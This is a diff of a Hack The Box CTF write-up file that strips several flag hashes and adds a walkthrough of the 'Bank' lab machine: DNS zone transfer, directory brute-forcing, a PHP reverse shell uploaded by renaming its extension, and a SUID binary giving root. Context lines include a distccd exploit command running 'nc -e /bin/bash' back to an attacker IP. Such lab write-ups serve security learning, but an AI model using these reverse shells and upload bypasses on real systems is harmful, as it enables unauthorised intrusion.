@@ -62,8 +62,6 @@ use exploit/windows/smb/ms17_010_psexec
 use exploit/windows/smb/ms08_067_netapi
 ```
 
-User.txt : e69af0e4f443de7e36876fda4ec7644f
-Root.txt : 993442d258b0e0ec917cae9e695d5713
 
 
 # Linux : Lame : 10.10.10.3 : Easy
@@ -169,8 +167,6 @@ python distccd_rce_CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc -e /bin/bash 10
 
 Dirty Cow exploit could be found here : https://www.exploit-db.com/raw/40839
 
-user.txt : 8dc227d300c4d1682ca6ff26941d1da5
-root.txt : 0b9de15261bc1bd8176196055d533015
 
 
 
@@ -302,8 +298,7 @@ RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
 Dirty Cow vulnerability will help us get root on this scene as we noticed that the kernel version is old and is one of the kernel versions that are vulnerable to the Dirty Cow exploit which can be found here:
 https://www.exploit-db.com/exploits/40839
 
-user.txt : e6710a5464769fd5fcd216e076961750
-root.txt : f1bb6d759df1f272914ebbc9ed7765b2
+
 
 # Linux : Shocker : 10.10.10.56 : Easy 
 
@@ -428,10 +423,112 @@ https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injectio
 Like stated in the changelog and in the changelog it was said only two of them are patched.
 
 
-# Windows : Access : 10.10.10.98 : Easy
+# Linux : Bank : 10.10.10.29 : Easy
 
 Nmap Results :
 
 ```
+Nmap scan report for 10.10.10.29
+Host is up (0.058s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
+|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
+|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
+|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
+53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Jan 29 13:12:05 2021 -- 1 IP address (1 host up) scanned in 16.37 seconds
 
 ```
+
+Here we have a DNS port open so my first thought is to search for possible subdomains and ennumerate the dns port for which i used dig. 
+
+```bash
+dig @10.10.10.29 bank.htb -t AXFR +nocookie
+```
+
+and the results that we get are :
+
+```
+; <<>> DiG 9.16.4-Debian <<>> @10.10.10.29 bank.htb -t AXFR +nocookie
+; (1 server found)
+;; global options: +cmd
+bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 5 604800 86400 2419200 604800
+bank.htb.               604800  IN      NS      ns.bank.htb.
+bank.htb.               604800  IN      A       10.10.10.29
+ns.bank.htb.            604800  IN      A       10.10.10.29
+www.bank.htb.           604800  IN      CNAME   bank.htb.
+bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 5 604800 86400 2419200 604800
+;; Query time: 51 msec
+;; SERVER: 10.10.10.29#53(10.10.10.29)
+;; WHEN: Fri Jan 29 13:34:21 GMT 2021
+;; XFR size: 6 records (messages 1, bytes 171)
+```
+
+Nothing really pops up leaving the bank.htb which i guessed due to how HTB names its domain. 
+
+Now moving forward with this information we can go to the page and we are greeted with a login page but lets try brute forcing the directories and  we can use the command 
+
+```
+gobuster dir -u http://bank.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  -x php,txt
+```
+
+and we get a directory called /balance-transfer/
+
+![](./images/bank/transfers.png)
+
+In the one where we find the size to be diffrent we can find credentials that will work for the email.
+
+Logging into the system we find a dahsboard and a support page which seems to have a upload function and if we check the source code :
+
+![](./images/bank/uploads.png)
+
+So later we find out that we can execute remote php code just by renmaing our php file as htb so lets get a php reverse shell and we can put our IP and Port and rename the reverse shell as reverse.htb and then we can upload
+
+![](./images/bank/rev.png)
+
+and we can see our ticket in the Attachment page now clicking on Click Here we get our shell back which you have to listen for with nc.
+
+We get a non TTY session so lets spawn a tty shell we can use this command :
+
+```
+python -c 'import pty; pty.spawn("/bin/sh")'
+```
+
+doing sudo -l we are prompted for a password so i will try other things for now lets search for files with SUID/GUID permissions.
+
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+
+and searching for it we get this as our results :
+```
+/var/htb/bin/emergency
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/bin/at
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/traceroute6.iputils
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/mtr
+/usr/sbin/uuidd
+/usr/sbin/pppd
+```
+and then just chekcing the emergency file its an executable lets try running it and guess what we get a root shell.
